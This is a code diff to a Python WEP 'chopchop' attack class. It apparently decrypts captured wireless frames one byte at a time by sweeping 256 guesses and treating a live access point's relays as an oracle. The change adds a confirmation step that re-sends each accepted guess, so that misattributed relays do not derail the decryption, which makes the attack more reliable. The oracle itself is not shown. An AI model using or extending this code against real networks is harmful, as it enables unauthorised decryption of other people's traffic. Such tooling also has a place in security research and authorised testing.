@@ -226,16 +226,33 @@ class WepChopChop:
 
     async def _find_accepted(self, body: bytes) -> Optional[int]:
         """Sweep guesses 0..255 for ``body``'s last byte; return the one the
-        oracle accepts (a relay), or None. Re-sweeps once on a clean miss (the
-        correct guess's single send may have been lost)."""
+        oracle accepts, or None. Re-sweeps once on a clean miss (the correct
+        guess's single send may have been lost).
+
+        Exactly one byte is mathematically valid per step (the ICV residue is
+        unique), so a relay normally pins it. But a relay can be MISATTRIBUTED
+        on the air — a sibling-BSS echo, or the true guess's relay slipping past
+        the timeout into the next guess's slot — which would corrupt the walk.
+        So we CONFIRM: re-send the accepted guess; the true byte relays every
+        time, a misattributed flag won't (re-sending a wrong guess is invalid)."""
         for _attempt in range(self._BYTE_RETRIES):
             for guess in range(256):
                 if not self._active:
                     return None
                 shortened = chop_last_byte_and_fixup(body, guess)
-                if await self._oracle(shortened):
+                if await self._oracle(shortened) and await self._confirm(shortened):
                     return guess
         return None
+
+    async def _confirm(self, shortened: bytes) -> bool:
+        """Re-send a relaying guess to confirm it's the true byte, not a
+        misattributed relay. Two tries (tolerates a single re-send loss)."""
+        for _ in range(2):
+            if not self._active:
+                return False
+            if await self._oracle(shortened):
+                return True
+        return False
 
     # ---- Live-AP oracle -----------------------------------------------------
 
